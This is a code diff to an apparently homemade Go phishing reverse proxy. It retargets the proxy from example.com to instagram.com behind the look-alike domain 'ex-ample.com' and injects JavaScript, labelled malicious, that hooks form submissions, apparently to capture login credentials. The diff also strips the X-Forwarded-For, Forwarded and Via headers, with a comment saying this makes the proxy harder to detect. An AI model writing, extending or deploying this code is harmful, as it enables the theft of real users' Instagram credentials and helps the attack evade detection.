@@ -16,7 +16,7 @@ import (
 )
 
 const (
-	targetDomain   = "example.com"
+	targetDomain   = "instagram.com"
 	phishingDomain = "ex-ample.com" // still confused abt this bit
 	jsPayload      = `// Add malicious JS here
 document.addEventListener('submit', function(e) {
@@ -35,15 +35,17 @@ func createProxy() *httputil.ReverseProxy {
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 
-	// Director modify the request before it goes to the target
+	// Modify request from proxy to target
 	proxy.Director = func(req *http.Request) {
 		req.URL.Scheme = target.Scheme
 		req.URL.Host = target.Host
 		req.Host = target.Host // Critic for SNI in TLS handshake
 
-		// Add security headers
-		req.Header.Set("X-Forwarded-Proto", "https")
-		req.Header.Set("X-Forwarded-For", req.RemoteAddr) // Preserve client IP
+		// Reomving those headers make proxy harder to detect
+		req.Header.Del("X-Forwarded-Proto")
+		req.Header.Del("X-Forwarded-For") // Sets the original IP that made request to proxy
+		req.Header.Del("Forwarded")
+		req.Header.Del("Via")
 	}
 
 	// Modify response from proxy to client
